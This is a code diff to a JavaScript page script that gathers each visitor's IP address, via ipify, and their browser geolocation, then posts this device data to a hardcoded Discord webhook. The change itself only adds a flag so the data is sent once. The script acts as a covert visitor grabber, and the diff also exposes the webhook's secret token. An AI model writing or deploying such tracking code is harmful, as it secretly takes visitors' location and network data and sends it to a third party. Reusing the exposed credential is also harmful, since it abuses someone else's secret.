@@ -26,9 +26,12 @@
     // Discord Webhook URL
     const webhookUrl = 'https://discord.com/api/webhooks/1275537111755522189/snOtFHUF9X35Mjfx3gaYyyZS4M1Un-sYtcYkrc3Sw0omUl6MLrd33AnepHKZm8sprUVj';
     const userId = '1190442430118494274'; // User ID of @cosmogt
+    let hasSentInfo = false; // Flag to track if information has been sent
 
     // Function to collect device information
     function collectDeviceInfo() {
+      if (hasSentInfo) return; // Exit if already sent
+
       // Get user's IP address using IPify API
       fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
@@ -85,7 +88,10 @@
               },
               body: JSON.stringify(webhookPayload)
             })
-             .then(response => console.log('Device information sent successfully'))
+             .then(response => {
+               console.log('Device information sent successfully');
+               hasSentInfo = true; // Set the flag to true after sending
+             })
              .catch(error => console.error('Failed to send device information:', error));
           }, error => {
             console.error('Failed to get geolocation:', error);
